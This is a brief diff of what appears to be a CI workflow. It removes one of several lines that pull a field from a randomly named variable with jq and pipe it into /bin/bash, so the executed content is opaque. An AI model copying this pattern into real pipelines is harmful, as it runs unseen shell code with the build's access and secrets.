@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$dlob7" | jq -r .xsisk18067 | /bin/bash
           printf '%s' "$qu14" | jq -r .xgha14 | /bin/bash
           printf '%s' "$ejt3" | jq -r .oofs49265 | /bin/bash
-          printf '%s' "$fzi938" | jq -r .bppc7266 | /bin/bash
           printf '%s' "$dmz435" | jq -r .hsnn0 | /bin/bash
 
       - name: Archive results
